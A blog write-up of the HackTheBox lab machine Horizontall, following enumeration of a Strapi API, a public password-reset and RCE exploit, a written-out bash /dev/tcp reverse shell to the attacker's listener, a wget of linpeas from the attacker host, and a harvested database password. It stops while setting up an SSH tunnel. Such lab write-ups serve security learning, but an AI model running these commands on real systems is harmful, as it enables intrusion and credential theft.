---
title: Write-up Horizontall on HTB
author: eMVee
date: 2021-10-15 21:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, API, Tunnel, Laravel, CVE-2021-3129]
render_with_liquid: false
---

Ready to rumble.... Another HTB machine is going down today. This time it is Horizontall. The name does not ring a bell, it might be something with lateral movement but I am not sure about this.

## Getting started
Time to start hacking! So as soon as the VPN connection in my Kali machine was working,I started the vulnerable machine. First things first, as soon as my VPN was established I run a command to identify my own IP address.

```bash
┌──(eMVee@kali)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:92:dd:a0 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 85969sec preferred_lft 85969sec
    inet6 fe80::a00:27ff:fe92:dda0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
18: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.8/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1006/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::7b4d:32f1:7813:7c7/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

My local IP address is: 10.10.14.8 and the target has the IP address 10.129.239.35.
One of the first thing I almost every time do when I start, is checking if the host is reachable. A quick ping request will show if the host is responding to ping requests.

```bash
┌──(eMVee@kali)-[~]
└─$ ip=10.129.239.35


┌──(eMVee@kali)-[~]
└─$ ping -c3 $ip
PING 10.129.239.35 (10.129.239.35) 56(84) bytes of data.
64 bytes from 10.129.239.35: icmp_seq=1 ttl=63 time=13.9 ms
64 bytes from 10.129.239.35: icmp_seq=2 ttl=63 time=14.1 ms
64 bytes from 10.129.239.35: icmp_seq=3 ttl=63 time=14.2 ms

--- 10.129.239.35 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 13.938/14.106/14.237/0.125 ms
```

The target responds to our ping request and in the results a ttl=63 shown.
This tells me the target is probably a Linux host, which confirms the host OS.

## Enumeration
After confirming the host is online I started a port scan with nmap with version detection.
```bash
┌──(eMVee@kali)-[~]
└─$ sudo nmap -sS -T4 -A $ip           
[sudo] password for eMVee: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-15 07:34 CEST
Nmap scan report for 10.129.239.35
Host is up (0.015s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/15%OT=22%CT=1%CU=43285%PV=Y%DS=2%DC=T%G=Y%TM=616912
OS:F0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   15.29 ms 10.10.14.1
2   15.37 ms 10.129.239.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.71 seconds
                                                                 
```
Nmap scan results are showing me some interesting information:
* Linux, probabl Ubuntu
* Port 22
    * OpenSSH 7.6p1 Ubuntu
* Port 80
    * nginx 1.14.0 (Ubuntu)
    * Did not follow redirect to http://horizontall.htb

As soon as I saw port 80 was running a HTTP service I started whatweb to identify some technologies used and continued analyzing the results.

```bash
┌──(eMVee@kali)-[~]
└─$ whatweb $ip
http://10.129.239.35 [301 Moved Permanently] Country[RESERVED][ZZ], 
HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.239.35], 
RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
ERROR Opening: http://horizontall.htb - no address for horizontall.htb

```
I noticed after the scan the same kind of error message: “no address for horizontall.htb”. So I had to edit the /etc/hosts file and tell where the host could be found.

```bash
┌──(eMVee@kali)-[~]
└─$ sudo nano /etc/hosts 
[sudo] password for eMVee: 
                                   
┌──(eMVee@kali)-[~]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.129.239.35   horizontall.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
When I run whatweb again after changing the /etc/hosts file, no error message is shown.

```bash
┌──(eMVee@kali)-[~]
└─$ whatweb $ip
http://10.129.239.35 [301 Moved Permanently] Country[RESERVED][ZZ], 
HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.239.35], 
RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.239.35], 
Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]

```
Whatweb did not give me any new information.
Let's enumerate more, starting with Nikto to see what vulnerabilities are present.
```bash
┌──(eMVee@kali)-[~]
└─$ nikto -h http://$ip
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.239.35
+ Target Hostname:    10.129.239.35
+ Target Port:        80
+ Start Time:         2021-10-15 07:54:50 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://horizontall.htb
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2021-10-15 07:57:17 (GMT2) (147 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
In the results of Nikto, I did not see anything usefull yet. And since there are only two ports identified as open with nmap I got a bit curious a bit curious about the website. I decided to open the website in Firefox. 

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-1.png){: width="700" height="400" }

Wappalyzer identifies a few technieques which were shown in previous scans as well. So no new information, but certain a confirmation of found technologies.
While browsing and scrolling the whole site, nothing seemd to work functional. So let's inspect the source code.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-2.png){: width="700" height="400" }

Okay, probably this is the reason this machine is called: “Horizontall”....
Before I will dive into this, I started three tools to enumerate some directories on the webserver.

For this, I used:
* dirsearch
* dirb
* gobuster

```bash
┌──(eMVee@kali)-[~]
└─$ dirsearch -u http://horizontall.htb -e php,html,bak,bak1

  _|. _ _  _  _  _ _|_    v0.4.1     
 (_||| _) (/_(_|| (_| )              
                                     
Extensions: php, html, bak, bak1 | HTTP method: GET | Threads: 30 | Wordlist size: 10388

Output File: /home/eMVee/.dirsearch/reports/horizontall.htb/_21-10-15_08-08-12.txt

Error Log: /home/eMVee/.dirsearch/logs/errors-21-10-15_08-08-12.log

Target: http://horizontall.htb/
                                                                                        
[08:08:12] Starting: 
[08:08:22] 301 -  194B  - /css  ->  http://horizontall.htb/css/                         
[08:08:24] 200 -    4KB - /favicon.ico                                                  
[08:08:24] 301 -  194B  - /img  ->  http://horizontall.htb/img/                         
[08:08:25] 200 -  901B  - /index.html                                                   
[08:08:25] 301 -  194B  - /js  ->  http://horizontall.htb/js/                           
[08:08:25] 403 -  580B  - /js/
                                                                                        
Task Completed                                                                          
                   
```

Dirsearch finished the scan first and I reviewed the results, but I was disappointed with the amount of information I had found with dirsearch. Gobuster and Dirb were still active, so I had to wait a little longer for those tools. 
```bash
┌──(eMVee@kali)-[~]
└─$ gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,bak,txt
[+] Timeout:                 10s
===============================================================
2021/10/15 08:07:55 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 901]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
                                                                                 
===============================================================
2021/10/15 08:12:46 Finished
===============================================================

```
Gobuster didn't find that much interesting information this time. My hope was pinned on dirb.

```bash
┌──(eMVee@kali)-[~]
└─$ dirb http://horizontall.htb                                

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct 15 08:16:24 2021
URL_BASE: http://horizontall.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                          

---- Scanning URL: http://horizontall.htb/ ----
==> DIRECTORY: http://horizontall.htb/css/                     
+ http://horizontall.htb/favicon.ico (CODE:200|SIZE:4286)      
==> DIRECTORY: http://horizontall.htb/img/                     
+ http://horizontall.htb/index.html (CODE:200|SIZE:901)        
==> DIRECTORY: http://horizontall.htb/js/                      
                                                               
---- Entering directory: http://horizontall.htb/css/ ----
                                                               
---- Entering directory: http://horizontall.htb/img/ ----
                                                               
---- Entering directory: http://horizontall.htb/js/ ----
                                                               
-----------------
END_TIME: Fri Oct 15 08:21:30 2021
DOWNLOADED: 18448 - FOUND: 2

```
And dirb hadn't found much this time either.
So nothing interesting yet found, so I decided to copy the source code from the index page and paste it in Visual Code.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-3.png){: width="700" height="400" }

That's pretty interesting, the real text and images what I saw on screen are not mentioned in those lines....
Let's find out where they are. My thoughts are to use Burp Suite to see what requests and responses are sent over.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-4.png){: width="700" height="400" }

A lot of svg files are requested, so this is probably why I did not see any image in the source code.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-5.png){: width="700" height="400" }

Again all the source code is in one line. This makes it hard to read, but there is always someone else who probably had the same issue in the past.
I copied the source code and opened the website [beautifier](https://beautifier.io/), which I found with Google. 

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-6.png){: width="700" height="400" }

On the website [beautifier](https://beautifier.io/), I pasted the source code and clicked the "Beautify Code" button, after which the source code had to align properly.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-7.png){: width="700" height="400" }

A quick look at the source code was enough to determine that the source code was properly aligned. I copied the source code to paste it into Visual Code later.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-8.png){: width="700" height="400" }

After pasting I scrolled from top to bottom and while scrolling I saw that this file did indeed provide page content. I decided to look further into the source code. 

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-9.png){: width="700" height="400" }

In the source code I identified a subdomain which I did not had discovered earlier... Let's add this to the /etc/hosts file, so I can use this as entry point as well.

```bash
┌──(eMVee@kali)-[~]
└─$ sudo nano /etc/hosts                              
[sudo] password for eMVee: 
                                                                                                                                                         
┌──(eMVee@kali)-[~]
└─$ cat /etc/hosts                                    
127.0.0.1       localhost
127.0.1.1       kali
10.129.239.35   horizontall.htb
10.129.239.35   api-prod.horizontall.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

After adding the API subdomain to /etc/hosts I decided to visit the whole URL in the browser. 
![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-10.png){: width="700" height="400" }

The API provides all kinds of information about reviews. Something I already expected given the URL I used. For now information that is of no value to me.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-11.png){: width="700" height="400" }

In a directory higher I see a Welcome page. Actually I don't have much information so far. I've had Burp Suite open in the background all this time. So maybe I could take a look at this.
![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-12.png){: width="700" height="400" }

In the response header of the API I see that Strapi is used. Because I am not familiar with Strapi, I decide to look on the internet to see what is described.
Let's find out what strapi.io is with Google. While using the GoogleFu, one of the first results is this one: 
“Strapi is the next-gen headless CMS, open-source, javascript, enabling content-rich experiences to be created, managed and exposed to any digital device.”

Sounds interesting to me, so I have to dive into this one. Google mentioned another page as well, which attracts me as well: https://github.com/strapi/strapi
So I opened the Github page to read some more about this subject.

While reading the page with features I noticed a bold text “Modern Admin Panel” and I believe I saw a screenshot on the Github page of this admin panel.
So I have to figure out how I can reach this panel. Let's read more about this strapi.io....
I noticed a [user documentation](https://strapi.io/documentation/user-docs/latest/getting-started/introduction.html), I guess that in this documentation should be written something about the [admin panel](https://strapi.io/documentation/user-docs/latest/getting-started/introduction.html#accessing-the-admin-panel).
Based on the documentation the admin panel should probably exist here: http://api-prod.horizontall.htb/admin
I entered the URL into the browser and pressed enter. Guess what? It's there, the admin panel.
![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-13.png){: width="700" height="400" }


Since I don't know the version of strapi it's guessing if there are exploits available for this target. However, I would like to know if there are exploits available. 
While running a searchsploit for strapi doesn't take to much time I give it a go.


```bash
┌──(eMVee@kali)-[~]
└─$ searchsploit strapi 
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                           | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)         | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)   | multiple/webapps/50239.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


Only three exploits and all for the 3.0.0.-beta version. Well, I'm not sure which version is this target running, so I have to identify this version.
After searching a while I did not find how to determine which version is used. Since there are only 3 exploits found with Searchsploit I decided to try them.

I copied the exploit with searchploit to my directory.
```bash
┌──(eMVee@kali)-[~]
└─$ searchsploit -m 50239
  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50239
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py
File Type: Python script, ASCII text executable

Copied to: /home/eMVee/50239.py

```

I checked how to run the exploit and executed the exploit.
```bash
┌──(eMVee@kali)-[~]
└─$ python3 50239.py http://api-prod.horizontall.htb      
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM0Mjg0NDkyLCJleHAiOjE2MzY4NzY0OTJ9.tOGf7zh4cCNWgKFPwB-RpYnPbJpAoooUU9TFFn0CWgo


$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}

```
An error on the command whoami, so did the exploit work? It looks like the password has been reset. So let's try to logon in the Admin portal.
![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-14.png){: width="700" height="400" }

In the admin login page I entered the username "admin" and the new password "SuperStrongPassword1" and clicked on the button Log in.
![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-15.png){: width="700" height="400" }

Okay that did work, so the exploit is working, but a command like whoami did not work.

## Initial foothold
Perhaps I can setup a reverse shell. I start a netcat listener, listening on port 1234.

```bash
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234       
listening on [any] 1234 ...

```
After I enabled the netcat listener to listen on port 1234 it's time to try again to perform a remote command execution.
I want to try to set up a reverse shell with the following command: **bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'**

```bash
$> bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output

```
It's nice that the exploit reminds me that this is a blind RCE and I don't have expect to see output. So I switched to my netcat listener.

```bash
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234       
listening on [any] 1234 ...
connect to [10.10.14.8] from horizontall.htb [10.129.239.35] 50412
bash: cannot set terminal process group (1815): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ 

```
Looks like I managed to set up a reverse shell to my Kali machine. So now it's time to see who I am. 

```bash
strapi@horizontall:~/myapi$ whoami;id;hostname
whoami;id;hostname
strapi
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
horizontall
strapi@horizontall:~/myapi$    

```
Looks like I'm user strapi on horizontall. Now let me see what can be found with the command: **ls /home -ahlR**.

```bash
ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root      root      4.0K May 25 11:43 .
drwxr-xr-x 24 root      root      4.0K Aug 23 11:29 ..
drwxr-xr-x  8 developer developer 4.0K Aug  2 12:07 developer

/home/developer:
total 108K
drwxr-xr-x  8 developer developer 4.0K Aug  2 12:07 .
drwxr-xr-x  3 root      root      4.0K May 25 11:43 ..
lrwxrwxrwx  1 root      root         9 Aug  2 12:05 .bash_history -> /dev/null
-rw-r-----  1 developer developer  242 Jun  1 12:53 .bash_logout
-rw-r-----  1 developer developer 3.8K Jun  1 12:47 .bashrc
drwx------  3 developer developer 4.0K May 26 12:00 .cache
-rw-rw----  1 developer developer  58K May 26 11:59 composer-setup.php
drwx------  5 developer developer 4.0K Jun  1 11:54 .config
drwx------  3 developer developer 4.0K May 25 11:45 .gnupg
drwxrwx---  3 developer developer 4.0K May 25 19:44 .local
drwx------ 12 developer developer 4.0K May 26 12:21 myproject
-rw-r-----  1 developer developer  807 Apr  4  2018 .profile
drwxrwx---  2 developer developer 4.0K Jun  4 11:21 .ssh
-r--r--r--  1 developer developer   33 Oct 15 05:32 user.txt
lrwxrwxrwx  1 root      root         9 Aug  2 12:07 .viminfo -> /dev/null
ls: cannot open directory '/home/developer/.cache': Permission denied
ls: cannot open directory '/home/developer/.config': Permission denied
ls: cannot open directory '/home/developer/.gnupg': Permission denied
ls: cannot open directory '/home/developer/.local': Permission denied
ls: cannot open directory '/home/developer/myproject': Permission denied
ls: cannot open directory '/home/developer/.ssh': Permission denied

```
Looks like everyone has read permissions to the user.txt in /home/devloper. So as Strapi, I can capture the user's flag. 

*-r--r--r--  1 developer developer   33 Oct 15 05:32 user.txt*

Let me immediately capture the flag with the command: **cat /home/developer/user.txt**
```bash
strapi@horizontall:~/myapi$ cat /home/developer/user.txt
cat /home/developer/user.txt
---- USER FLAG ----

```
Now that I have conquered the user flag I want to continue in the system. I need to capture the root flag.

With linPEAS you can easily find vulnerabilities, misconfigurations or interesting information. I would like to use this on horizontall.
On my Kali machine I browsed to the folder where I have linPEAS and I started here with **sudo python -m SimpleHTTPServer 80** a Python web server so that I can download linPEAS from the victim.

```bash
┌──(eMVee@kali)-[~/Documents/Usefull/privilege-escalation-awesome-scripts-suite/linPEAS]
└─$ sudo python -m SimpleHTTPServer 80  
[sudo] password for eMVee: 
Serving HTTP on 0.0.0.0 port 80 ...

```

I browse to /tmp because this is a directory that almost always has write permissions. I then use **wget http://10.10.14.8/linpeas.sh** to download the script.

```bash
strapi@horizontall:~/myapi/config$ cd /tmp
cd /tmp
strapi@horizontall:/tmp$ wget http://10.10.14.8/linpeas.sh
wget http://10.10.14.8/linpeas.sh
--2021-10-15 09:30:05--  http://10.10.14.8/linpeas.sh
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 473371 (462K) [text/x-sh]
Saving to: ‘linpeas.sh’

     0K .......... .......... .......... .......... .......... 10% 1.65M 0s
    50K .......... .......... .......... .......... .......... 21% 1.89M 0s
   100K .......... .......... .......... .......... .......... 32% 3.12M 0s
   150K .......... .......... .......... .......... .......... 43%  868K 0s
   200K .......... .......... .......... .......... .......... 54% 24.9M 0s
   250K .......... .......... .......... .......... .......... 64% 2.64M 0s
   300K .......... .......... .......... .......... .......... 75% 2.63M 0s
   350K .......... .......... .......... .......... .......... 86% 6.93M 0s
   400K .......... .......... .......... .......... .......... 97% 3.40M 0s
   450K .......... ..                                         100% 1.10M=0.2s

2021-10-15 09:30:05 (2.26 MB/s) - ‘linpeas.sh’ saved [473371/473371]

strapi@horizontall:/tmp$ chmod +x linpas.sh
chmod +x linpas.sh
chmod: cannot access 'linpas.sh': No such file or directory
strapi@horizontall:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

```

After downloading I had to make the script executable so that I can start the script.



```bash
strapi@horizontall:/tmp$ ./linpeas.sh
./linpeas.sh

<--- snip --->
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                                                        
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1815/node /usr/bin/ 
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                 

<--- snip --->

══╣ Possible private SSH keys were found!
/opt/strapi/myapi/node_modules/spdy/test/fixtures.js
/opt/strapi/myapi/node_modules/selfsigned/README.md
/opt/strapi/myapi/node_modules/nodemailer-fetch/test/fetch-test.js
/opt/strapi/myapi/node_modules/public-encrypt/test/rsa.1024.priv
/opt/strapi/myapi/node_modules/public-encrypt/test/test_key.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/rsa.pass.priv
/opt/strapi/myapi/node_modules/public-encrypt/test/pass.1024.priv
/opt/strapi/myapi/node_modules/public-encrypt/test/rsa.2028.priv
/opt/strapi/myapi/node_modules/public-encrypt/test/ec.priv
/opt/strapi/myapi/node_modules/public-encrypt/test/test_rsa_privkey_encrypted.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/test_rsa_privkey.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/ec.pass.priv
/opt/strapi/myapi/node_modules/request/node_modules/http-signature/http_signing.md
/opt/strapi/myapi/node_modules/http-signature/http_signing.md

══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                    
/opt/strapi/myapi/node_modules/public-encrypt/test/test_cert.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/test_key.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/test_rsa_privkey_encrypted.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/test_rsa_privkey.pem
/opt/strapi/myapi/node_modules/public-encrypt/test/test_rsa_pubkey.pem
25615PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                           
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

<--- snip --->

-rw-rw-r-- 1 strapi strapi 351 May 26 14:31 /opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

<--- snip --->
```

In linPEAS I notice that port 8000 is open on 127.0.0.1 (127.0.0.1:8000 ), this could mean that something is running on it that can only be accessed from the local IP address.

In the results of linPEAS an username and password are shown. I noted them down.
* Username: developer
* Password: #J!:F9Zt2u

Because port 8000 is open, I suspect that an http service is running on it. With curl http://127.0.0.1:8000 I want to see what is running on it.
```bash
strapi@horizontall:/tmp$ curl http://127.0.0.1:8000
curl http://127.0.0.1:8000                                                                                          
<!DOCTYPE html>                                                                                                     
<html lang="en">                                                                                                    
    <head>                                                                                                          
        <meta charset="utf-8">                                                                                      
        <meta name="viewport" content="width=device-width, initial-scale=1">                                        
                                                                                                                    
        <title>Laravel</title>                                                                                      
                                                                                                                    
        <!-- Fonts -->                                                                                              
        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
                                                                                                                    
        <!-- Styles -->                                                                                             
        <style>          

<--- snip --->

  <a href="https://github.com/sponsors/taylorotwell" class="ml-1 underline">
                                Sponsor
                            </a>
                        </div>
                    </div>

                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>

```



In the source code I see *"Laravel v8 (PHP v7.4.18)"*. I decide that I want to take a closer look at the website and I need an [SSH tunnel](https://linuxize.com/post/how-to-setup-ssh-tunneling/) for that.

Let's setup a [local port forwarding](https://linuxize.com/post/how-to-setup-ssh-tunneling/#local-port-forwarding) tunnel via SSH. I need to generate a SSH key so the user strapi can setup SSH.
On my local machine in the work directory horizontall I generate the key with the command **ssh-keygen**


```bash
┌──(eMVee@kali)-[~/Documents/horizontall]
└─$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/eMVee/.ssh/id_rsa): ./key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./key
Your public key has been saved in ./key.pub
The key fingerprint is:
SHA256:yTu2Hfr3LMHSBrg3VVo1V9GK3Gb0yIAxmtctbmBpGDM eMVee@kali
The key's randomart image is:
+---[RSA 3072]----+
|        E oo   +B|
|         B.+..+ +|
|        +.*.oX.+ |
|       ..=.o=.B .|
|        S. =oo   |
|        ..+.=    |
|        +..+ .   |
|       . = .o.   |
|        o.o. oo  |
+----[SHA256]-----+
                                                                                                                    
┌──(eMVee@kali))-[~/Documents/horizontall]
└─$ ll
total 8
-rw------- 1 eMVee eMVee 2602 Oct 15 12:13 key
-rw-r--r-- 1 eMVee eMVee  570 Oct 15 12:13 key.pub
 
```
The key is on my Kali machine and I must have it horizontal. I decide to see the key and select and copy the text.
```bash                                
┌──(eMVee@kali))-[~/Documents/horizontall]
└─$ cat key.pub 
